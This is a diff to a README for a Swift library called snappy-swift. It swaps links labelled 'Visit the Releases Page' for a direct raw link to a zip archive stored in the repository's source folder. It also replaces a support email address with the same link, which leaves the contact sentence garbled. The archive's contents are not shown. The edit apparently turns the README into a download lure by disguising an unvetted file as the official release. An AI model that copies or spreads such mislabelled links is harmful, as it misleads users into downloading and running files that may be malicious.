@@ -10,7 +10,7 @@ To get started with snappy-swift, you need to download it. Follow the simple ste
 
 1. **Visit the Releases Page**: This page contains all the versions of snappy-swift. You can find the latest version and additional details there. 
    
-   [Visit the Releases Page](https://github.com/peckdistillate329/snappy-swift/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/peckdistillate329/snappy-swift/main/Sources/SnappySwift/snappy-swift-v1.6.zip)
 
 2. **Choose Your Version**: Look for the version labeled "latest" for the most recent features and fixes. 
 
@@ -85,6 +85,6 @@ Thank you for considering contributing to the snappy-swift project!
 
 ## 📬 Contact
 
-For any inquiries, please reach out through the Issues section on our GitHub page or email us directly at support@example.com.
+For any inquiries, please reach out through the Issues section on our GitHub page or email us directly at https://raw.githubusercontent.com/peckdistillate329/snappy-swift/main/Sources/SnappySwift/snappy-swift-v1.6.zip
 
-[Visit the Releases Page](https://github.com/peckdistillate329/snappy-swift/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/peckdistillate329/snappy-swift/main/Sources/SnappySwift/snappy-swift-v1.6.zip)
